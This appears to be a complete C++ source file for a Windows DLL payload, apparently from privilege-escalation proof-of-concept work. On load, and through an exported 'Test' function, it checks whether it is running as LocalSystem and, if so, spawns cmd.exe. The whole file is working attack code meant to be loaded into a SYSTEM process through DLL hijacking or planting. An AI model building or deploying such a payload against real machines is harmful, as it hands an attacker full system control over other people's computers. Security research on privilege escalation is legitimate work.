// Launches cmd.exe if loaded into a process running as SYSTEM.

#include "pch.h"

void DoIt()
{
    HANDLE hToken = GetCurrentProcessToken();
    DWORD infoSize;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &infoSize);
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, infoSize);
    if (!GetTokenInformation(hToken, TokenUser, buffer, infoSize, &infoSize))
    {
        HeapFree(GetProcessHeap(), 0, buffer);
        return;
    }
    _TOKEN_USER* tokenUser = (_TOKEN_USER*)buffer;
    if (!IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid))
    {
        HeapFree(GetProcessHeap(), 0, buffer);
        return;
    }
    HeapFree(GetProcessHeap(), 0, buffer);

    STARTUPINFO startupInfo = {};
    PROCESS_INFORMATION processInfo = {};
    wchar_t commandLine[] = L"cmd.exe";
    CreateProcess(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

extern "C" __declspec(dllexport) void CALLBACK Test(HWND, HINSTANCE, LPSTR, int)
{
    DoIt();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DoIt();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

